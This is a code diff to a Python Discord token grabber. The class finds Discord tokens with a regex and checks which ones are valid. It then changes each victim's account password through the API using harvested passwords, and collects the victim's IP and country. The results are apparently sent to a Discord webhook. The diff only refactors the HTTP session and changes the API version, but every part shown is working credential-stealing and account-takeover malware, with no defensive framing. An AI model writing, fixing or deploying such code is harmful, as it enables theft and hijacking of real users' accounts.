@@ -1,12 +1,10 @@
 import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime
 
-session = requests.Session()
-
 class Grabber:
     def __init__(self):
         self.webhook = "https://discordapp.com/api/webhooks/some nice webhook url here plz"
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
-        self.api = "https://discordapp.com/api/v7/"
+        self.api = "https://discordapp.com/api/v6/"
         self.errors = {
             1: 'Unauthorized',
             2: 'Invalid two-factor code'
@@ -17,6 +15,7 @@ class Grabber:
         self.passwords = []
         self.tokens = []
         self.validTokens = []
+        self.session = requests.Session()
 
     def getHeaders(self, token): 
         headers = {
@@ -40,7 +39,7 @@ class Grabber:
                     self.validTokens.append(token)
         for token in self.validTokens:
             for password in self.passwords:
-                userInfo = session.get(self.api + 'users/@me', headers=self.getHeaders(token))
+                userInfo = self.session.get(self.api + 'users/@me', headers=self.getHeaders(token))
                 userInfo = userInfo.json()
                 payload = {
                     'avatar': userInfo['avatar'],
@@ -49,7 +48,7 @@ class Grabber:
                     'password': password,
                     'new_password': newPassword
                 }
-                r = session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
+                r = self.session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
                 r_json = r.json()
                 message = f'= {time} ='
                 message += f'\nToken :: {token}'
@@ -129,7 +128,7 @@ class Grabber:
             return os.getenv('APPDATA') 
 
     def newEmail(self):
-        email = session.get("https://ically.net/user.php?user=", data={"data": ""}).text
+        email = self.session.get("https://ically.net/user.php?user=", data={"data": ""}).text
         return email
 
     def newPassword(self):
@@ -137,7 +136,7 @@ class Grabber:
         return passw
 
     def grabIP(self):
-        r = session.get('https://api.myip.com/')
+        r = self.session.get('https://api.myip.com/')
         data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}'
         return data
 
